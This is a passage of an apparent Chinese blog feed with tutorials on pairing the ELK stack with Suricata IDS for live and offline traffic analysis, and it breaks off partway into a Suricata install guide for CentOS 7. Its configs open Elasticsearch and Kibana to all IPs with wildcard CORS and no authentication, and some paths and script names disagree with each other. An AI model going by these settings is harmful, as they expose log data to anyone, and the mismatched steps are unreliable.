elasticsearch:elasticsearch /data/es-data<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-2-4设置log的目录"><a href="#3-2-4设置log的目录" class="headerlink" title="3.2.4设置log的目录"></a>3.2.4设置log的目录</h3><p>创建/data/es-log目录，用于elasticsearch日志的存放</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mkdir</span> -p /log/es-log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改该目录的拥有者为elasticsearch</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chown</span> -R elasticsearch:elasticsearch /log/es-log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-2-5-修改配置文件elasticsearch-yml"><a href="#3-2-5-修改配置文件elasticsearch-yml" class="headerlink" title="3.2.5 修改配置文件elasticsearch.yml"></a>3.2.5 修改配置文件elasticsearch.yml</h3><pre class="line-numbers language-bash"><code class="language-bash">vim /etc/elasticsearch/elasticsearch.yml<span class="token function">egrep</span> -v <span class="token string">"^#|^$"</span> /etc/elasticsearch/elasticsearch.yml#查看配置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#设置data存放的路径为/data/es-data</span>path.data: /data/es-data<span class="token comment" spellcheck="true">#设置logs日志的路径为/log/es-log</span>path.logs: /log/es-log<span class="token comment" spellcheck="true">#设置内存不使用交换分区</span>bootstrap.memory_lock: <span class="token boolean">false</span><span class="token comment" spellcheck="true">#配置了bootstrap.memory_lock为true时反而会引发9200不会被监听，原因不明</span><span class="token comment" spellcheck="true">#设置允许所有ip可以连接该elasticsearch</span>network.host: 0.0.0.0<span class="token comment" spellcheck="true">#开启监听的端口为9200</span>http.port: 9200<span class="token comment" spellcheck="true">#节点名称</span>node.name: node-1<span class="token comment" spellcheck="true">#增加新的参数，为了让elasticsearch-head插件可以访问es (5.x版本，如果没有可以自己手动加)</span>http.cors.enabled: <span class="token boolean">true</span>http.cors.allow-origin: <span class="token string">"*"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-2-6启动elasticsearch"><a href="#3-2-6启动elasticsearch" class="headerlink" title="3.2.6启动elasticsearch"></a>3.2.6启动elasticsearch</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> systemctl start elasticsearch<span class="token comment" spellcheck="true">#启动   </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>出错1：</p><p><img src="/2020/09/11/install-guide-elk-suricata/1603863067395.png" alt="1603863067395"></p><p>solution:配置文件加下面代码：</p><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">bootstrap.system_call_filter</span><span class="token punctuation">:</span> <span class="token boolean important">false </span><span class="token key atrule">cluster.initial_master_nodes</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"node-1"</span><span class="token punctuation">]</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查看状态</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl status elasticsearch <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置开机启动</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl <span class="token function">enable</span> elasticsearch <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动成功之后，测试服务是否开启</p><pre class="line-numbers language-bash"><code class="language-bash">curl -X GET http://localhost:9200 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-elk-suricata/1603805643890.png" alt="1603805643890"></p><h3 id="3-2-7-卸载"><a href="#3-2-7-卸载" class="headerlink" title="3.2.7 卸载"></a>3.2.7 卸载</h3><pre class="line-numbers language-bash"><code class="language-bash">yum remove elasticsearch<span class="token function">sudo</span> <span class="token function">rm</span> -rf /var/lib/elasticsearch/<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/elasticsearch<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="3-3-logStash"><a href="#3-3-logStash" class="headerlink" title="3.3  logStash"></a>3.3  logStash</h2><h3 id="3-3-1-下载安装"><a href="#3-3-1-下载安装" class="headerlink" title="3.3.1 下载安装"></a>3.3.1 下载安装</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> https://artifacts.elastic.co/downloads/logstash/logstash-7.8.0.rpmrpm -ivh logstash-7.8.0.rpm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-elk-suricata/1603805962140.png" alt="1603805962140"></p><h3 id="3-2-2设置data的目录"><a href="#3-2-2设置data的目录" class="headerlink" title="3.2.2设置data的目录"></a>3.2.2设置data的目录</h3><p>创建/data/ls-data目录，用于logstash数据的存放</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mkdir</span> -p /data/ls-data <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改该目录的拥有者为logstash</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chown</span> -R logstash:logstash /data/ls-data <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-3-3设置log的目录"><a href="#3-3-3设置log的目录" class="headerlink" title="3.3.3设置log的目录"></a>3.3.3设置log的目录</h3><p>创建/data/ls-log目录，用于logstash日志的存放</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mkdir</span> -p /log/ls-log <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改该目录的拥有者为logstash</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chown</span> -R logstash:logstash /log/ls-log <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-3-4设置conf-d的目录，创建配置文件"><a href="#3-3-4设置conf-d的目录，创建配置文件" class="headerlink" title="3.3.4设置conf.d的目录，创建配置文件"></a>3.3.4设置conf.d的目录，创建配置文件</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#进入logstash目录 </span><span class="token function">cd</span> /etc/logstash <span class="token comment" spellcheck="true">#创建conf.d的目录 </span><span class="token function">mkdir</span> conf.d <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>创建配置文件，日志内容输出到elasticsearch中，如下所示</p><pre class="line-numbers language-bash"><code class="language-bash">vim /etc/logstash/conf.d/logstash.conf<span class="token function">vi</span> /etc/logstash/conf.d/logstash.conf<span class="token function">chown</span> root /etc/logstash/conf.d/logstash.conf <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>logstash.conf 文件内容如下：注意其中的path为suricata日志：/var/log/suricata/eve.json</p><pre class="line-numbers language-yaml"><code class="language-yaml">input &amp;<span class="token comment" spellcheck="true">#123;</span>  file &amp;<span class="token comment" spellcheck="true">#123;</span>    path =<span class="token punctuation">></span> <span class="token punctuation">[</span><span class="token string">"/var/log/suricata/eve.json"</span><span class="token punctuation">]</span>    codec =<span class="token punctuation">></span> json  &amp;<span class="token comment" spellcheck="true">#125;</span>&amp;<span class="token comment" spellcheck="true">#125;</span>filter &amp;<span class="token comment" spellcheck="true">#123;</span>&amp;<span class="token comment" spellcheck="true">#125;</span>output &amp;<span class="token comment" spellcheck="true">#123;</span>  elasticsearch &amp;<span class="token comment" spellcheck="true">#123;</span>    hosts =<span class="token punctuation">></span> "127.0.0.1<span class="token punctuation">:</span>9200"    index =<span class="token punctuation">></span> "suricata<span class="token punctuation">-</span>%&amp;<span class="token comment" spellcheck="true">#123;+YYYY.MM.dd&amp;#125;"</span>  &amp;<span class="token comment" spellcheck="true">#125;</span>&amp;<span class="token comment" spellcheck="true">#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-3-5修改配置文件logstash-yml"><a href="#3-3-5修改配置文件logstash-yml" class="headerlink" title="3.3.5修改配置文件logstash.yml"></a>3.3.5修改配置文件logstash.yml</h3><pre class="line-numbers language-bash"><code class="language-bash">vim /etc/logstash/logstash.yml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>内容如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 设置数据的存储路径为/data/ls-data </span>path.data: /data/ls-data <span class="token comment" spellcheck="true"># 设置管道配置文件路径为/etc/logstash/conf.d </span>path.config: /etc/logstash/conf.d <span class="token comment" spellcheck="true"># 设置日志文件的存储路径为/log/ls-log </span>path.logs: /log/ls-log <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-3-6启动logstash"><a href="#3-3-6启动logstash" class="headerlink" title="3.3.6启动logstash"></a>3.3.6启动logstash</h3><p>启动logstash命令如下，注意该命令不会指定配置文件启动。</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl start logstash <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-elk-suricata/1603951213781.png" alt="1603951213781"></p><p>查看</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl status logstash <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置开机启动</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl <span class="token function">enable</span> logstash <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-3-7-测试logstash"><a href="#3-3-7-测试logstash" class="headerlink" title="3.3.7 测试logstash"></a>3.3.7 测试logstash</h3><p>–config.test_and_exit表示，检查测试创建的logstash.conf配置文件，是否有问题，如果没有问题，执行之后，<strong>显示Configuration OK 证明配置成功！</strong></p><pre class="line-numbers language-bash"><code class="language-bash">/usr/share/logstash/bin/logstash  -f /etc/logstash/conf.d/logstash.conf --config.test_and_exit <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>**如果报错：WARNING: Could not find logstash.yml which is typically located in $LS_HOME/config or /etc/logstash. You can specify the path using –path.settings. **</p><p>解决办法：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/share/logstash <span class="token function">ln</span> -s /etc/logstash ./config <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>测试成功！</p><p><img src="/2020/09/11/install-guide-elk-suricata/1603806572175.png" alt="1603806572175"></p><h3 id="3-3-8-logstash指定配置进行运行"><a href="#3-3-8-logstash指定配置进行运行" class="headerlink" title="3.3.8 logstash指定配置进行运行"></a>3.3.8 logstash指定配置进行运行</h3><p>指定logstash.conf配置文件，以后台的方式运用，执行这段命令之后，需要回车一下</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">nohup</span> /usr/share/logstash/bin/logstash -f /etc/logstash/conf.d/logstash.conf <span class="token operator">&amp;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>检查logstash是否启动</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span> -ef<span class="token operator">|</span><span class="token function">grep</span> logstash <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>显示如下信息，说明启动了</p><p><img src="http://www.justdojava.com/assets/images/2019/java/image-jay/a29ab2058ff04df4bac898a8759f1a47.jpg" alt="img"></p><h3 id="3-3-9-卸载"><a href="#3-3-9-卸载" class="headerlink" title="3.3.9 卸载"></a>3.3.9 卸载</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/default/logstash \/etc/logstash \/var/lib/logstash \/var/log/logstash \/usr/share/logstash \/usr/share/kibana/x-pack/plugins/logstash \/usr/share/kibana/x-pack/plugins/monitoring/public/components/logstash \/usr/share/kibana/x-pack/plugins/monitoring/public/components/metricbeat_migration/instruction_steps/logstash \/usr/share/kibana/x-pack/plugins/monitoring/public/lib/logstash \/usr/share/kibana/x-pack/plugins/monitoring/public/views/logstash \/usr/share/kibana/x-pack/plugins/monitoring/server/lib/logstash \/usr/share/kibana/x-pack/plugins/monitoring/server/lib/metrics/logstash \/usr/share/kibana/x-pack/plugins/monitoring/server/routes/api/v1/logstash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-3-10"><a href="#3-3-10" class="headerlink" title="3.3.10"></a>3.3.10</h3><p>找错，查看logstash运行日志</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl status logstash -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-4-kibana"><a href="#3-4-kibana" class="headerlink" title="3.4  kibana"></a>3.4  kibana</h2><h3 id="3-4-1-安装"><a href="#3-4-1-安装" class="headerlink" title="3.4.1 安装"></a>3.4.1 安装</h3><p> <a href="https://www.elastic.co/cn/downloads/kibana">官网下载kibaba7.8版本</a>  </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> https://artifacts.elastic.co/downloads/kibana/kibana-7.8.0-x86_64.rpmrpm -ivh kibana-7.8.0-x86_64.rpm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-elk-suricata/1603808067228.png" alt="1603808067228"></p><p>搜索rpm包</p><pre class="line-numbers language-bash"><code class="language-bash">rpm -ql kibana<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>默认是装在/usr/share/kibana/下。</p><h3 id="3-3-2修改kibana-yml"><a href="#3-3-2修改kibana-yml" class="headerlink" title="3.3.2修改kibana.yml"></a>3.3.2修改kibana.yml</h3><p>修改kibana的配置文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">vi</span> /etc/kibana/kibana.yml <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>内容如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#kibana页面映射在5601端口 </span>server.port: 5601 <span class="token comment" spellcheck="true">#允许所有ip访问5601端口 </span>server.host: <span class="token string">"0.0.0.0"</span> <span class="token comment" spellcheck="true">#elasticsearch所在的ip及监听的地址 </span>elasticsearch.hosts: <span class="token punctuation">[</span><span class="token string">"http://localhost:9200"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-4-3启动kibana"><a href="#3-4-3启动kibana" class="headerlink" title="3.4.3启动kibana"></a>3.4.3启动kibana</h3><pre class="line-numbers language-bash"><code class="language-bash">systemctl start kibana <span class="token comment" spellcheck="true">#启动</span>systemctl status kibana<span class="token comment" spellcheck="true">#查看状态</span>systemctl <span class="token function">enable</span> kibana<span class="token comment" spellcheck="true">#设置开机启动</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>kibana启动成功的界面</p><p><img src="/2020/09/11/install-guide-elk-suricata/1603808420430.png" alt="1603808420430"></p><h3 id="3-4-4-卸载"><a href="#3-4-4-卸载" class="headerlink" title="3.4.4 卸载"></a>3.4.4 卸载</h3><pre class="line-numbers language-bash"><code class="language-bash">yum remove kibana<span class="token function">find</span> / -name kibana<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/kibana \/var/lib/kibana \/usr/share/elasticsearch/modules/kibana \/usr/share/kibana \/usr/share/logstash/modules/fb_apache/configuration/kibana \/usr/share/logstash/modules/netflow/configuration/kibana \/usr/share/logstash/x-pack/modules/arcsight/configuration/kibana \/usr/share/logstash/x-pack/modules/azure/configuration/kibana<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-5-相关配置总结"><a href="#3-5-相关配置总结" class="headerlink" title="3.5 相关配置总结"></a>3.5 相关配置总结</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">##suricata</span>/var/log/suricata/ <span class="token comment" spellcheck="true">#日志目录</span><span class="token comment" spellcheck="true">##elk日志目录log:</span><span class="token function">tail</span> -n 20  /var/log/messages <span class="token comment" spellcheck="true">##ES:/usr/share/elasticsearch</span>/usr/share/elasticsearch/bin/elasticsearch<span class="token comment" spellcheck="true">#安装目录</span><span class="token function">egrep</span> -v <span class="token string">"^#|^$"</span> /etc/elasticsearch/elasticsearch.yml<span class="token function">vi</span> /etc/elasticsearch/elasticsearch.ymlpath.data: /var/lib/elasticsearchpath.logs: /var/log/elasticsearch<span class="token comment" spellcheck="true">##logstash:</span>/usr/share/logstash/bin/logstash<span class="token comment" spellcheck="true">#安装目录</span>path.data: /var/lib/logstashpipeline.ordered: autopath.logs: /var/log/logstash<span class="token function">egrep</span> -v <span class="token string">"^#|^$"</span> /etc/logstash/conf.d/logstash.conf/etc/logstash/logstash.yml <span class="token comment" spellcheck="true">##kibana:</span>/usr/share/kibana/bin/kibana<span class="token comment" spellcheck="true">#安装目录</span><span class="token function">egrep</span> -v <span class="token string">"^#|^$"</span> /etc/kibana/kibana.yml <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="4-在线模式部署"><a href="#4-在线模式部署" class="headerlink" title="4 在线模式部署"></a>4 在线模式部署</h1><p>在线模式部署：即suricata实时处理其他机器镜像过来的流量。然后elk进行数据化展示。</p><p>依次开启kibana elasticsearch logstash，这里需要注意的是logstash不能采用默认开启方式systemctl start logstash，因为默认配置不加载/etc/logstash/conf.d/logstash.conf文件，则加载不成功suricata日志。具体命令如下：</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl start kibana logstash elasticsearchsystemctl start logstash<span class="token comment" spellcheck="true">#错误开启，不会加载配置文件/etc/logstash/conf.d/logstash.conf</span><span class="token function">nohup</span> /usr/share/logstash/bin/logstash -f /etc/logstash/conf.d/logstash.conf <span class="token operator">&amp;</span> <span class="token comment" spellcheck="true">#指定配置文件开启logstash  正确操作</span><span class="token function">sudo</span> <span class="token function">nohup</span> /usr/local/bin/suricata -c /etc/suricata/suricata.yaml -i eth0 --init-errors-fatal <span class="token operator">&amp;</span>  <span class="token comment" spellcheck="true">#启动suricata</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>开启成功后，访问kibina,可以看到suricata日志数据。</p><p><img src="/2020/09/11/install-guide-elk-suricata/1603951881328.png" alt="1603951881328"></p><h1 id="5-离线模式部署"><a href="#5-离线模式部署" class="headerlink" title="5 离线模式部署"></a>5 离线模式部署</h1><h2 id="5-1-suricata分析流量包功能"><a href="#5-1-suricata分析流量包功能" class="headerlink" title="5.1 suricata分析流量包功能"></a>5.1 suricata分析流量包功能</h2><p> 分析单个包：suricata -r pcap文件名 -l 自定义输出位置</p><p> 分析文件夹里所以的包：suricata -r pcap文件夹名 -l 自定义输出位置 </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> /usr/local/bin/suricata -c /etc/suricata/suricata.yaml -r /tmp/test.cap -l  /var/log/suricata/cap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5-2-离线模式工作原理"><a href="#5-2-离线模式工作原理" class="headerlink" title="5.2 离线模式工作原理"></a>5.2 离线模式工作原理</h2><p>离线模式工作原理：离线一词即，流量收集集群将抓取的流量scp定时发送到ids主机，然后ids主机定时启动suricata -r分析cap流量文件，然后推送到elk进行展示。该过程涉及两个部分。其中定时采用linux的crontab。</p><p>（1）流量收集集群定时推送流量文件到ids主机</p><p>定时推送流量到ids主机脚本send.sh如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token function">scp</span> -Rf /root/testdir/ wasadmin@10.127.40.25:/root/temp/<span class="token comment" spellcheck="true">#复制到ids文件夹/root/temp/</span><span class="token function">rm</span> -rf /root/testdir/*<span class="token comment" spellcheck="true">#删除该主机文件夹下的所有文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>（2）ids主机定时分析</p><p>ids主机定时分析脚本如下suricara.sh：</p><pre class="line-numbers language-bash"><code class="language-bash">suricata -c /etc/suricata/suricata.yaml -r /root/temp/<span class="token function">rm</span> -rf /root/temp/*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>定时执行suricara.sh，在终端输入以下命令：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">crontab</span> -e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在显示的文件末尾添加以下规则：#每5分钟运行一次time.sh脚本,并把错误和正确的日志都存到/tmp/load.log上。</p><pre class="line-numbers language-bash"><code class="language-bash">*/5 * * * * /root/time.sh <span class="token operator">></span> /tmp/load.log 2<span class="token operator">></span><span class="token operator">&amp;</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑完成，保存完成以后，就会显示以下提示信息：</p><pre class="line-numbers language-bash"><code class="language-bash">crontab: installing new <span class="token function">crontab</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这就说明正在安装新的定时任务，如果没有这条提示信息，请重新运行<code>crontab -e</code>命令。</p><p><img src="/2020/09/11/install-guide-elk-suricata/1604578836302-1611127871322.png" alt="1604578836302"></p><h1 id="错误解决"><a href="#错误解决" class="headerlink" title="错误解决"></a>错误解决</h1><p><img src="/2020/09/11/install-guide-elk-suricata/1603938736430.png" alt="1603938736430"></p><p><a href="https://blog.csdn.net/weixin_44105991/article/details/91320644">Solution</a>：</p><p>1 先执行命令 free -m查看内存是不是还有 最主要的是 看有没有交换空间 swap  </p><p>2  创建swapfile：dd if=/dev/zero of=swapfile bs=1024 count=500000</p><p>3  将swapfile设置为swap空间    mkswap swapfile </p><p>4  启用交换空间   swapon swapfile ( 删除交换空间是swapoff swapfile )</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">free</span> -m<span class="token function">dd</span> if<span class="token operator">=</span>/dev/zero of<span class="token operator">=</span>swapfile bs<span class="token operator">=</span>1024 count<span class="token operator">=</span>500000mkswap swapfile swapon swapfile <span class="token function">free</span> -m<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://redmine.openinfosecfoundation.org/projects/suricata/wiki/_Logstash_Kibana_and_Suricata_JSON_output">官网suricata+elk部署指南</a></p><p><a href="https://www.elastic.co/cn/downloads/">elk官方下载连接</a></p><p><a href="http://www.justdojava.com/2019/08/11/elk-install/">elk部署教程</a> 简单清晰</p><p><a href="https://zhuanlan.zhihu.com/p/64742715">suricata+elk其他部署方式</a></p><p><a href="https://developer.ibm.com/zh/articles/os-cn-elk-filebeat/">elk架构+filebeat解析</a></p><p><a href="https://developer.ibm.com/zh/articles/os-cn-elk-filebeat/">elk日志收集教程</a></p><p><a href="https://aws.amazon.com/cn/blogs/china/using-vpc-traffic-mirroring-to-construct-network-intrusion-detection-system-update/">借助 VPC Traffic Mirroring 构建网络入侵检测系统</a>  实时分析流量</p><p><a href="https://www.freebuf.com/articles/network/249549.html">elk+suricata(docker部署)</a></p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">流量分析</category>
      
      
      <comments>https://m01ly.github.io/2020/09/11/install-guide-elk-suricata/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>centos7中安装suricata</title>
      <link>https://m01ly.github.io/2020/09/11/install-guide-suricata/</link>
      <guid>https://m01ly.github.io/2020/09/11/install-guide-suricata/</guid>
      <pubDate>Fri, 11 Sep 2020 09:59:18 GMT</pubDate>
      
      <description>&lt;p&gt;由于不断的安全威胁，入侵检测系统（IDS）已成为当今&lt;a href=&quot;http://www.learnfuture.com/product/datacenter&quot;&gt;数据中心&lt;/a&gt;环境中最关键的要求之一。但是，随着越来越多的服务器将其NIC升级到10GB / 40GB以太网，以线速在商用硬件上实施计算密集型入侵检测变得越来越困难。扩展IDS性能的一种方法是多线程IDS，其中CPU密集型深度数据包检查工作负载并行化为多个并发任务。这种并行检查可以利用多核硬件轻松扩展IDS吞吐量。这个领域的两个着名的开源工作是Suricata和Bro。&lt;/p&gt;
&lt;p&gt;在本教程中，我将演示如何在&lt;a href=&quot;http://www.learnfuture.com/Linux&quot;&gt;Linux&lt;/a&gt;服务器上安装和配置Suricata IDS。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>由于不断的安全威胁，入侵检测系统（IDS）已成为当今<a href="http://www.learnfuture.com/product/datacenter">数据中心</a>环境中最关键的要求之一。但是，随着越来越多的服务器将其NIC升级到10GB / 40GB以太网，以线速在商用硬件上实施计算密集型入侵检测变得越来越困难。扩展IDS性能的一种方法是多线程IDS，其中CPU密集型深度数据包检查工作负载并行化为多个并发任务。这种并行检查可以利用多核硬件轻松扩展IDS吞吐量。这个领域的两个着名的开源工作是Suricata和Bro。</p><p>在本教程中，我将演示如何在<a href="http://www.learnfuture.com/Linux">Linux</a>服务器上安装和配置Suricata IDS。</p><a id="more"></a><p>官网： <a href="https://suricata-ids.org/">https://suricata-ids.org/</a> </p><p>官网安装教程： <a href="https://redmine.openinfosecfoundation.org/projects/suricata/wiki/Suricata_Installation">https://redmine.openinfosecfoundation.org/projects/suricata/wiki/Suricata_Installation</a> </p><p>centos官网安装教程： <a href="https://redmine.openinfosecfoundation.org/projects/suricata/wiki/CentOS_Installation">https://redmine.openinfosecfoundation.org/projects/suricata/wiki/CentOS_Installation</a> </p><h1 id="一安装教程"><a href="#一安装教程" class="headerlink" title="一安装教程"></a>一安装教程</h1><p>操作系统：Centos7</p><p>安装版本：suricata6.0.0</p><p>1)安装wget</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@suricata~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># yum install wget -y</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2)更换源</p><p>　　更换成阿里云源，更新系统、下载软件速度快</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@suricata~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup</span><span class="token punctuation">[</span>root@suricata~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><span class="token punctuation">[</span>root@suricata~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># yum clean all</span><span class="token punctuation">[</span>root@suricata~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># yum makecache</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>3)更新系统</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># yum -y update</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603261907715.png" alt="1603261907715"></p><p>4)安装epel</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># yum install epel-release</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603261947721.png" alt="1603261947721"></p><p>5)安装相关依赖</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># sudo yum -y install gcc libpcap-devel pcre-devel libyaml-devel file-devel \</span>zlib-devel jansson-devel nss-devel libcap-ng-devel libnet-devel <span class="token function">tar</span> <span class="token function">make</span> \libnetfilter_queue-devel lua-devel PyYAML libmaxminddb-devel rustc cargo \lz4-devel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603262215276.png" alt="1603262215276"></p><p>6)开始安装suricata</p><p>这里尝试安装官网<a href="https://www.openinfosecfoundation.org/download/suricata-6.0.0.tar.gz">最新6.0版本</a></p><p> <a href="https://suricata-ids.org/download/">https://suricata-ids.org/download/</a> </p><p><img src="/2020/09/11/install-guide-suricata/1603262265601.png" alt="1603262265601"></p><p>下载安装包，进行解压配置安装：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># wget https://www.openinfosecfoundation.org/download/suricata-6.0.0.tar.gz</span><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># tar -xvzf suricata-6.0.0.tar.gz</span><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cd suricata-6.0.0</span><span class="token punctuation">[</span>root@m01ly suricata-6.0.0<span class="token punctuation">]</span><span class="token comment" 